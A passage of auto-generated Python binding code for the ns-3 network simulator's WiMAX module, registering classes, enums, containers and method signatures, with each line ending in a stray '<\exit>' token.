module.add_class('ObjectFactoryValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('OutputStreamWrapper', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])<\exit>
module.add_class('Packet', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])<\exit>
module.add_class('RandomVariableChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('RandomVariableValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('SimpleOfdmWimaxPhy', parent=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('FrameDurationCode', ['FRAME_DURATION_2_POINT_5_MS', 'FRAME_DURATION_4_MS', 'FRAME_DURATION_5_MS', 'FRAME_DURATION_8_MS', 'FRAME_DURATION_10_MS', 'FRAME_DURATION_12_POINT_5_MS', 'FRAME_DURATION_20_MS'], outer_class=root_module['ns3::SimpleOfdmWimaxPhy'])<\exit>
module.add_class('TimeChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('TimeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('TypeIdChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('TypeIdValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('UintegerValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('WimaxChannel', parent=root_module['ns3::Channel'])<\exit>
module.add_class('WimaxNetDevice', parent=root_module['ns3::NetDevice'])<\exit>
module.add_enum('Direction', ['DIRECTION_DOWNLINK', 'DIRECTION_UPLINK'], outer_class=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('RangingStatus', ['RANGING_STATUS_EXPIRED', 'RANGING_STATUS_CONTINUE', 'RANGING_STATUS_ABORT', 'RANGING_STATUS_SUCCESS'], outer_class=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_class('AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('BaseStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('State', ['BS_STATE_DL_SUB_FRAME', 'BS_STATE_UL_SUB_FRAME', 'BS_STATE_TTG', 'BS_STATE_RTG'], outer_class=root_module['ns3::BaseStationNetDevice'])<\exit>
module.add_enum('MacPreamble', ['SHORT_PREAMBLE', 'LONG_PREAMBLE'], outer_class=root_module['ns3::BaseStationNetDevice'])<\exit>
module.add_class('SimpleOfdmWimaxChannel', parent=root_module['ns3::WimaxChannel'])<\exit>
module.add_enum('PropModel', ['RANDOM_PROPAGATION', 'FRIIS_PROPAGATION', 'LOG_DISTANCE_PROPAGATION', 'COST231_PROPAGATION'], outer_class=root_module['ns3::SimpleOfdmWimaxChannel'])<\exit>
module.add_class('SubscriberStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('State', ['SS_STATE_IDLE', 'SS_STATE_SCANNING', 'SS_STATE_SYNCHRONIZING', 'SS_STATE_ACQUIRING_PARAMETERS', 'SS_STATE_WAITING_REG_RANG_INTRVL', 'SS_STATE_WAITING_INV_RANG_INTRVL', 'SS_STATE_WAITING_RNG_RSP', 'SS_STATE_ADJUSTING_PARAMETERS', 'SS_STATE_REGISTERED', 'SS_STATE_TRANSMITTING', 'SS_STATE_STOPPED'], outer_class=root_module['ns3::SubscriberStationNetDevice'])<\exit>
module.add_enum('EventType', ['EVENT_NONE', 'EVENT_WAIT_FOR_RNG_RSP', 'EVENT_DL_MAP_SYNC_TIMEOUT', 'EVENT_LOST_DL_MAP', 'EVENT_LOST_UL_MAP', 'EVENT_DCD_WAIT_TIMEOUT', 'EVENT_UCD_WAIT_TIMEOUT', 'EVENT_RANG_OPP_WAIT_TIMEOUT'], outer_class=root_module['ns3::SubscriberStationNetDevice'])<\exit>
module.add_container('std::vector< ns3::ServiceFlow * >', 'ns3::ServiceFlow *', container_type='vector')<\exit>
module.add_container('std::vector< bool >', 'bool', container_type='vector')<\exit>
module.add_container('ns3::bvec', 'bool', container_type='vector')<\exit>
module.add_container('std::vector< ns3::DlFramePrefixIe >', 'ns3::DlFramePrefixIe', container_type='vector')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::Packet > >', 'ns3::Ptr< ns3::Packet >', container_type='list')<\exit>
module.add_container('std::vector< ns3::SSRecord * >', 'ns3::SSRecord *', container_type='vector')<\exit>
module.add_container('std::vector< ns3::OfdmUlBurstProfile >', 'ns3::OfdmUlBurstProfile', container_type='vector')<\exit>
module.add_container('std::list< ns3::OfdmUlMapIe >', 'ns3::OfdmUlMapIe', container_type='list')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::UlJob > >', 'ns3::Ptr< ns3::UlJob >', container_type='list')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::Packet const > >', 'ns3::Ptr< ns3::Packet const >', container_type='list')<\exit>
module.add_container('std::deque< ns3::WimaxMacQueue::QueueElement >', 'ns3::WimaxMacQueue::QueueElement', container_type='dequeue')<\exit>
module.add_container('std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > >', 'std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > >', container_type='list')<\exit>
module.add_container('std::vector< ns3::Ptr< ns3::WimaxConnection > >', 'ns3::Ptr< ns3::WimaxConnection >', container_type='vector')<\exit>
module.add_container('std::vector< ns3::OfdmDlBurstProfile >', 'ns3::OfdmDlBurstProfile', container_type='vector')<\exit>
module.add_container('std::list< ns3::OfdmDlMapIe >', 'ns3::OfdmDlMapIe', container_type='list')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogNodePrinter')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogNodePrinter*')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogNodePrinter&')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogTimePrinter')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogTimePrinter*')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogTimePrinter&')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >', 'ns3::bvec')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >*', 'ns3::bvec*')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >&', 'ns3::bvec&')<\exit>
nested_module = module.add_cpp_namespace('FatalImpl')<\exit>
register_types_ns3_FatalImpl(nested_module)<\exit>
nested_module = module.add_cpp_namespace('internal')<\exit>
register_types_ns3_internal(nested_module)<\exit>
def register_types_ns3_FatalImpl(module):<\exit>
root_module = module.get_root()<\exit>
def register_types_ns3_internal(module):<\exit>
root_module = module.get_root()<\exit>
def register_methods(root_module):<\exit>
register_Ns3Address_methods(root_module, root_module['ns3::Address'])<\exit>
register_Ns3AsciiTraceHelper_methods(root_module, root_module['ns3::AsciiTraceHelper'])<\exit>
register_Ns3AsciiTraceHelperForDevice_methods(root_module, root_module['ns3::AsciiTraceHelperForDevice'])<\exit>
register_Ns3AttributeConstructionList_methods(root_module, root_module['ns3::AttributeConstructionList'])<\exit>
register_Ns3AttributeConstructionListItem_methods(root_module, root_module['ns3::AttributeConstructionList::Item'])<\exit>
register_Ns3Buffer_methods(root_module, root_module['ns3::Buffer'])<\exit>
register_Ns3BufferIterator_methods(root_module, root_module['ns3::Buffer::Iterator'])<\exit>
register_Ns3ByteTagIterator_methods(root_module, root_module['ns3::ByteTagIterator'])<\exit>
register_Ns3ByteTagIteratorItem_methods(root_module, root_module['ns3::ByteTagIterator::Item'])<\exit>
register_Ns3ByteTagList_methods(root_module, root_module['ns3::ByteTagList'])<\exit>
register_Ns3ByteTagListIterator_methods(root_module, root_module['ns3::ByteTagList::Iterator'])<\exit>
register_Ns3ByteTagListIteratorItem_methods(root_module, root_module['ns3::ByteTagList::Iterator::Item'])<\exit>
register_Ns3CallbackBase_methods(root_module, root_module['ns3::CallbackBase'])<\exit>
register_Ns3Cid_methods(root_module, root_module['ns3::Cid'])<\exit>
register_Ns3CidFactory_methods(root_module, root_module['ns3::CidFactory'])<\exit>
register_Ns3CsParameters_methods(root_module, root_module['ns3::CsParameters'])<\exit>
register_Ns3DcdChannelEncodings_methods(root_module, root_module['ns3::DcdChannelEncodings'])<\exit>
register_Ns3DlFramePrefixIe_methods(root_module, root_module['ns3::DlFramePrefixIe'])<\exit>
register_Ns3EventId_methods(root_module, root_module['ns3::EventId'])<\exit>
register_Ns3IpcsClassifierRecord_methods(root_module, root_module['ns3::IpcsClassifierRecord'])<\exit>
register_Ns3Ipv4Address_methods(root_module, root_module['ns3::Ipv4Address'])<\exit>
register_Ns3Ipv4Mask_methods(root_module, root_module['ns3::Ipv4Mask'])<\exit>
register_Ns3Ipv6Address_methods(root_module, root_module['ns3::Ipv6Address'])<\exit>
register_Ns3Ipv6Prefix_methods(root_module, root_module['ns3::Ipv6Prefix'])<\exit>
register_Ns3LogComponent_methods(root_module, root_module['ns3::LogComponent'])<\exit>
register_Ns3Mac48Address_methods(root_module, root_module['ns3::Mac48Address'])<\exit>
register_Ns3NetDeviceContainer_methods(root_module, root_module['ns3::NetDeviceContainer'])<\exit>
register_Ns3NodeContainer_methods(root_module, root_module['ns3::NodeContainer'])<\exit>
register_Ns3ObjectBase_methods(root_module, root_module['ns3::ObjectBase'])<\exit>
register_Ns3ObjectDeleter_methods(root_module, root_module['ns3::ObjectDeleter'])<\exit>
register_Ns3ObjectFactory_methods(root_module, root_module['ns3::ObjectFactory'])<\exit>
register_Ns3OfdmDcdChannelEncodings_methods(root_module, root_module['ns3::OfdmDcdChannelEncodings'])<\exit>
register_Ns3OfdmDlBurstProfile_methods(root_module, root_module['ns3::OfdmDlBurstProfile'])<\exit>
register_Ns3OfdmDlMapIe_methods(root_module, root_module['ns3::OfdmDlMapIe'])<\exit>
register_Ns3OfdmUlBurstProfile_methods(root_module, root_module['ns3::OfdmUlBurstProfile'])<\exit>
register_Ns3OfdmUlMapIe_methods(root_module, root_module['ns3::OfdmUlMapIe'])<\exit>
register_Ns3PacketMetadata_methods(root_module, root_module['ns3::PacketMetadata'])<\exit>
register_Ns3PacketMetadataItem_methods(root_module, root_module['ns3::PacketMetadata::Item'])<\exit>
register_Ns3PacketMetadataItemIterator_methods(root_module, root_module['ns3::PacketMetadata::ItemIterator'])<\exit>
register_Ns3PacketTagIterator_methods(root_module, root_module['ns3::PacketTagIterator'])<\exit>
register_Ns3PacketTagIteratorItem_methods(root_module, root_module['ns3::PacketTagIterator::Item'])<\exit>
register_Ns3PacketTagList_methods(root_module, root_module['ns3::PacketTagList'])<\exit>
register_Ns3PacketTagListTagData_methods(root_module, root_module['ns3::PacketTagList::TagData'])<\exit>
register_Ns3PcapFile_methods(root_module, root_module['ns3::PcapFile'])<\exit>
register_Ns3PcapHelper_methods(root_module, root_module['ns3::PcapHelper'])<\exit>
register_Ns3PcapHelperForDevice_methods(root_module, root_module['ns3::PcapHelperForDevice'])<\exit>
register_Ns3RandomVariable_methods(root_module, root_module['ns3::RandomVariable'])<\exit>
register_Ns3SNRToBlockErrorRateManager_methods(root_module, root_module['ns3::SNRToBlockErrorRateManager'])<\exit>
register_Ns3SNRToBlockErrorRateRecord_methods(root_module, root_module['ns3::SNRToBlockErrorRateRecord'])<\exit>
register_Ns3SSRecord_methods(root_module, root_module['ns3::SSRecord'])<\exit>
register_Ns3SeedManager_methods(root_module, root_module['ns3::SeedManager'])<\exit>
register_Ns3SendParams_methods(root_module, root_module['ns3::SendParams'])<\exit>
register_Ns3SequentialVariable_methods(root_module, root_module['ns3::SequentialVariable'])<\exit>
register_Ns3ServiceFlow_methods(root_module, root_module['ns3::ServiceFlow'])<\exit>
register_Ns3ServiceFlowRecord_methods(root_module, root_module['ns3::ServiceFlowRecord'])<\exit>
register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])<\exit>
register_Ns3Simulator_methods(root_module, root_module['ns3::Simulator'])<\exit>
register_Ns3Tag_methods(root_module, root_module['ns3::Tag'])<\exit>
register_Ns3TagBuffer_methods(root_module, root_module['ns3::TagBuffer'])<\exit>
register_Ns3TlvValue_methods(root_module, root_module['ns3::TlvValue'])<\exit>
register_Ns3TosTlvValue_methods(root_module, root_module['ns3::TosTlvValue'])<\exit>
register_Ns3TriangularVariable_methods(root_module, root_module['ns3::TriangularVariable'])<\exit>
register_Ns3TypeId_methods(root_module, root_module['ns3::TypeId'])<\exit>
register_Ns3TypeIdAttributeInformation_methods(root_module, root_module['ns3::TypeId::AttributeInformation'])<\exit>
register_Ns3TypeIdTraceSourceInformation_methods(root_module, root_module['ns3::TypeId::TraceSourceInformation'])<\exit>
register_Ns3U16TlvValue_methods(root_module, root_module['ns3::U16TlvValue'])<\exit>
register_Ns3U32TlvValue_methods(root_module, root_module['ns3::U32TlvValue'])<\exit>
register_Ns3U8TlvValue_methods(root_module, root_module['ns3::U8TlvValue'])<\exit>
register_Ns3UcdChannelEncodings_methods(root_module, root_module['ns3::UcdChannelEncodings'])<\exit>
register_Ns3UniformVariable_methods(root_module, root_module['ns3::UniformVariable'])<\exit>
register_Ns3VectorTlvValue_methods(root_module, root_module['ns3::VectorTlvValue'])<\exit>
register_Ns3WeibullVariable_methods(root_module, root_module['ns3::WeibullVariable'])<\exit>
register_Ns3WimaxHelper_methods(root_module, root_module['ns3::WimaxHelper'])<\exit>
register_Ns3ZetaVariable_methods(root_module, root_module['ns3::ZetaVariable'])<\exit>
register_Ns3ZipfVariable_methods(root_module, root_module['ns3::ZipfVariable'])<\exit>
register_Ns3Empty_methods(root_module, root_module['ns3::empty'])<\exit>
register_Ns3Int64x64_t_methods(root_module, root_module['ns3::int64x64_t'])<\exit>
register_Ns3SimpleOfdmSendParam_methods(root_module, root_module['ns3::simpleOfdmSendParam'])<\exit>
register_Ns3Chunk_methods(root_module, root_module['ns3::Chunk'])<\exit>
register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, root_module['ns3::ClassificationRuleVectorTlvValue'])<\exit>
register_Ns3ConstantVariable_methods(root_module, root_module['ns3::ConstantVariable'])<\exit>
register_Ns3CsParamVectorTlvValue_methods(root_module, root_module['ns3::CsParamVectorTlvValue'])<\exit>
register_Ns3DeterministicVariable_methods(root_module, root_module['ns3::DeterministicVariable'])<\exit>
register_Ns3EmpiricalVariable_methods(root_module, root_module['ns3::EmpiricalVariable'])<\exit>
register_Ns3ErlangVariable_methods(root_module, root_module['ns3::ErlangVariable'])<\exit>
register_Ns3ExponentialVariable_methods(root_module, root_module['ns3::ExponentialVariable'])<\exit>
register_Ns3GammaVariable_methods(root_module, root_module['ns3::GammaVariable'])<\exit>
register_Ns3Header_methods(root_module, root_module['ns3::Header'])<\exit>
register_Ns3IntEmpiricalVariable_methods(root_module, root_module['ns3::IntEmpiricalVariable'])<\exit>
register_Ns3Ipv4AddressTlvValue_methods(root_module, root_module['ns3::Ipv4AddressTlvValue'])<\exit>
register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, root_module['ns3::Ipv4AddressTlvValue::ipv4Addr'])<\exit>
register_Ns3LogNormalVariable_methods(root_module, root_module['ns3::LogNormalVariable'])<\exit>
register_Ns3MacHeaderType_methods(root_module, root_module['ns3::MacHeaderType'])<\exit>
register_Ns3ManagementMessageType_methods(root_module, root_module['ns3::ManagementMessageType'])<\exit>
register_Ns3NormalVariable_methods(root_module, root_module['ns3::NormalVariable'])<\exit>
register_Ns3Object_methods(root_module, root_module['ns3::Object'])<\exit>
register_Ns3ObjectAggregateIterator_methods(root_module, root_module['ns3::Object::AggregateIterator'])<\exit>
register_Ns3OfdmDownlinkFramePrefix_methods(root_module, root_module['ns3::OfdmDownlinkFramePrefix'])<\exit>
register_Ns3OfdmSendParams_methods(root_module, root_module['ns3::OfdmSendParams'])<\exit>
register_Ns3OfdmUcdChannelEncodings_methods(root_module, root_module['ns3::OfdmUcdChannelEncodings'])<\exit>
register_Ns3PacketBurst_methods(root_module, root_module['ns3::PacketBurst'])<\exit>
register_Ns3ParetoVariable_methods(root_module, root_module['ns3::ParetoVariable'])<\exit>
register_Ns3PcapFileWrapper_methods(root_module, root_module['ns3::PcapFileWrapper'])<\exit>
register_Ns3PortRangeTlvValue_methods(root_module, root_module['ns3::PortRangeTlvValue'])<\exit>
register_Ns3PortRangeTlvValuePortRange_methods(root_module, root_module['ns3::PortRangeTlvValue::PortRange'])<\exit>
register_Ns3PriorityUlJob_methods(root_module, root_module['ns3::PriorityUlJob'])<\exit>
register_Ns3PropagationLossModel_methods(root_module, root_module['ns3::PropagationLossModel'])<\exit>
register_Ns3ProtocolTlvValue_methods(root_module, root_module['ns3::ProtocolTlvValue'])<\exit>
register_Ns3RandomPropagationLossModel_methods(root_module, root_module['ns3::RandomPropagationLossModel'])<\exit>
register_Ns3RangePropagationLossModel_methods(root_module, root_module['ns3::RangePropagationLossModel'])<\exit>
register_Ns3RngReq_methods(root_module, root_module['ns3::RngReq'])<\exit>
register_Ns3RngRsp_methods(root_module, root_module['ns3::RngRsp'])<\exit>
register_Ns3SSManager_methods(root_module, root_module['ns3::SSManager'])<\exit>
register_Ns3ServiceFlowManager_methods(root_module, root_module['ns3::ServiceFlowManager'])<\exit>
register_Ns3SfVectorTlvValue_methods(root_module, root_module['ns3::SfVectorTlvValue'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])<\exit>
register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])<\exit>
register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])<\exit>
register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])<\exit>
register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])<\exit>
register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])<\exit>
register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])<\exit>
register_Ns3SsServiceFlowManager_methods(root_module, root_module['ns3::SsServiceFlowManager'])<\exit>
register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, root_module['ns3::ThreeLogDistancePropagationLossModel'])<\exit>
register_Ns3Time_methods(root_module, root_module['ns3::Time'])<\exit>
register_Ns3Tlv_methods(root_module, root_module['ns3::Tlv'])<\exit>
register_Ns3TraceSourceAccessor_methods(root_module, root_module['ns3::TraceSourceAccessor'])<\exit>
register_Ns3Trailer_methods(root_module, root_module['ns3::Trailer'])<\exit>
register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, root_module['ns3::TwoRayGroundPropagationLossModel'])<\exit>
register_Ns3Ucd_methods(root_module, root_module['ns3::Ucd'])<\exit>
register_Ns3UlJob_methods(root_module, root_module['ns3::UlJob'])<\exit>
register_Ns3UlMap_methods(root_module, root_module['ns3::UlMap'])<\exit>
register_Ns3UplinkScheduler_methods(root_module, root_module['ns3::UplinkScheduler'])<\exit>
register_Ns3UplinkSchedulerMBQoS_methods(root_module, root_module['ns3::UplinkSchedulerMBQoS'])<\exit>
register_Ns3UplinkSchedulerRtps_methods(root_module, root_module['ns3::UplinkSchedulerRtps'])<\exit>
register_Ns3UplinkSchedulerSimple_methods(root_module, root_module['ns3::UplinkSchedulerSimple'])<\exit>
register_Ns3WimaxConnection_methods(root_module, root_module['ns3::WimaxConnection'])<\exit>
register_Ns3WimaxMacQueue_methods(root_module, root_module['ns3::WimaxMacQueue'])<\exit>
register_Ns3WimaxMacToMacHeader_methods(root_module, root_module['ns3::WimaxMacToMacHeader'])<\exit>
register_Ns3WimaxPhy_methods(root_module, root_module['ns3::WimaxPhy'])<\exit>
register_Ns3AttributeAccessor_methods(root_module, root_module['ns3::AttributeAccessor'])<\exit>
register_Ns3AttributeChecker_methods(root_module, root_module['ns3::AttributeChecker'])<\exit>
register_Ns3AttributeValue_methods(root_module, root_module['ns3::AttributeValue'])<\exit>
register_Ns3BSScheduler_methods(root_module, root_module['ns3::BSScheduler'])<\exit>
register_Ns3BSSchedulerRtps_methods(root_module, root_module['ns3::BSSchedulerRtps'])<\exit>
register_Ns3BSSchedulerSimple_methods(root_module, root_module['ns3::BSSchedulerSimple'])<\exit>
register_Ns3BandwidthRequestHeader_methods(root_module, root_module['ns3::BandwidthRequestHeader'])<\exit>
register_Ns3BsServiceFlowManager_methods(root_module, root_module['ns3::BsServiceFlowManager'])<\exit>
register_Ns3CallbackChecker_methods(root_module, root_module['ns3::CallbackChecker'])<\exit>
register_Ns3CallbackImplBase_methods(root_module, root_module['ns3::CallbackImplBase'])<\exit>
register_Ns3CallbackValue_methods(root_module, root_module['ns3::CallbackValue'])<\exit>
register_Ns3Channel_methods(root_module, root_module['ns3::Channel'])<\exit>
register_Ns3ConnectionManager_methods(root_module, root_module['ns3::ConnectionManager'])<\exit>
register_Ns3Dcd_methods(root_module, root_module['ns3::Dcd'])<\exit>
register_Ns3DlMap_methods(root_module, root_module['ns3::DlMap'])<\exit>
register_Ns3DsaAck_methods(root_module, root_module['ns3::DsaAck'])<\exit>
register_Ns3DsaReq_methods(root_module, root_module['ns3::DsaReq'])<\exit>
register_Ns3DsaRsp_methods(root_module, root_module['ns3::DsaRsp'])<\exit>
register_Ns3EmptyAttributeValue_methods(root_module, root_module['ns3::EmptyAttributeValue'])<\exit>
register_Ns3EventImpl_methods(root_module, root_module['ns3::EventImpl'])<\exit>
register_Ns3FixedRssLossModel_methods(root_module, root_module['ns3::FixedRssLossModel'])<\exit>
register_Ns3FragmentationSubheader_methods(root_module, root_module['ns3::FragmentationSubheader'])<\exit>
register_Ns3FriisPropagationLossModel_methods(root_module, root_module['ns3::FriisPropagationLossModel'])<\exit>
register_Ns3GenericMacHeader_methods(root_module, root_module['ns3::GenericMacHeader'])<\exit>
register_Ns3GrantManagementSubheader_methods(root_module, root_module['ns3::GrantManagementSubheader'])<\exit>
register_Ns3IpcsClassifier_methods(root_module, root_module['ns3::IpcsClassifier'])<\exit>
register_Ns3Ipv4AddressChecker_methods(root_module, root_module['ns3::Ipv4AddressChecker'])<\exit>
register_Ns3Ipv4AddressValue_methods(root_module, root_module['ns3::Ipv4AddressValue'])<\exit>
register_Ns3Ipv4MaskChecker_methods(root_module, root_module['ns3::Ipv4MaskChecker'])<\exit>
register_Ns3Ipv4MaskValue_methods(root_module, root_module['ns3::Ipv4MaskValue'])<\exit>
register_Ns3Ipv6AddressChecker_methods(root_module, root_module['ns3::Ipv6AddressChecker'])<\exit>
register_Ns3Ipv6AddressValue_methods(root_module, root_module['ns3::Ipv6AddressValue'])<\exit>
register_Ns3Ipv6PrefixChecker_methods(root_module, root_module['ns3::Ipv6PrefixChecker'])<\exit>
register_Ns3Ipv6PrefixValue_methods(root_module, root_module['ns3::Ipv6PrefixValue'])<\exit>
register_Ns3LogDistancePropagationLossModel_methods(root_module, root_module['ns3::LogDistancePropagationLossModel'])<\exit>
register_Ns3Mac48AddressChecker_methods(root_module, root_module['ns3::Mac48AddressChecker'])<\exit>
register_Ns3Mac48AddressValue_methods(root_module, root_module['ns3::Mac48AddressValue'])<\exit>
register_Ns3MatrixPropagationLossModel_methods(root_module, root_module['ns3::MatrixPropagationLossModel'])<\exit>
register_Ns3NakagamiPropagationLossModel_methods(root_module, root_module['ns3::NakagamiPropagationLossModel'])<\exit>
register_Ns3NetDevice_methods(root_module, root_module['ns3::NetDevice'])<\exit>
register_Ns3NixVector_methods(root_module, root_module['ns3::NixVector'])<\exit>
register_Ns3Node_methods(root_module, root_module['ns3::Node'])<\exit>
register_Ns3ObjectFactoryChecker_methods(root_module, root_module['ns3::ObjectFactoryChecker'])<\exit>
register_Ns3ObjectFactoryValue_methods(root_module, root_module['ns3::ObjectFactoryValue'])<\exit>
register_Ns3OutputStreamWrapper_methods(root_module, root_module['ns3::OutputStreamWrapper'])<\exit>
register_Ns3Packet_methods(root_module, root_module['ns3::Packet'])<\exit>
register_Ns3RandomVariableChecker_methods(root_module, root_module['ns3::RandomVariableChecker'])<\exit>
register_Ns3RandomVariableValue_methods(root_module, root_module['ns3::RandomVariableValue'])<\exit>
register_Ns3SimpleOfdmWimaxPhy_methods(root_module, root_module['ns3::SimpleOfdmWimaxPhy'])<\exit>
register_Ns3TimeChecker_methods(root_module, root_module['ns3::TimeChecker'])<\exit>
register_Ns3TimeValue_methods(root_module, root_module['ns3::TimeValue'])<\exit>
register_Ns3TypeIdChecker_methods(root_module, root_module['ns3::TypeIdChecker'])<\exit>
register_Ns3TypeIdValue_methods(root_module, root_module['ns3::TypeIdValue'])<\exit>
register_Ns3UintegerValue_methods(root_module, root_module['ns3::UintegerValue'])<\exit>
register_Ns3WimaxChannel_methods(root_module, root_module['ns3::WimaxChannel'])<\exit>
register_Ns3WimaxNetDevice_methods(root_module, root_module['ns3::WimaxNetDevice'])<\exit>
register_Ns3AddressChecker_methods(root_module, root_module['ns3::AddressChecker'])<\exit>
register_Ns3AddressValue_methods(root_module, root_module['ns3::AddressValue'])<\exit>
register_Ns3BaseStationNetDevice_methods(root_module, root_module['ns3::BaseStationNetDevice'])<\exit>
register_Ns3SimpleOfdmWimaxChannel_methods(root_module, root_module['ns3::SimpleOfdmWimaxChannel'])<\exit>
register_Ns3SubscriberStationNetDevice_methods(root_module, root_module['ns3::SubscriberStationNetDevice'])<\exit>
return<\exit>
def register_Ns3Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type'), param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_constructor([param('ns3::Address const &', 'address')])<\exit>
cls.add_method('CheckCompatible',<\exit>
'bool',<\exit>
[param('uint8_t', 'type'), param('uint8_t', 'len')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyAllFrom',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_method('CopyAllTo',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint8_t', 'len')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyFrom',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_method('CopyTo',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'buffer')])<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsInvalid',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('uint8_t', 'type')],<\exit>
is_const=True)<\exit>
cls.add_method('Register',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
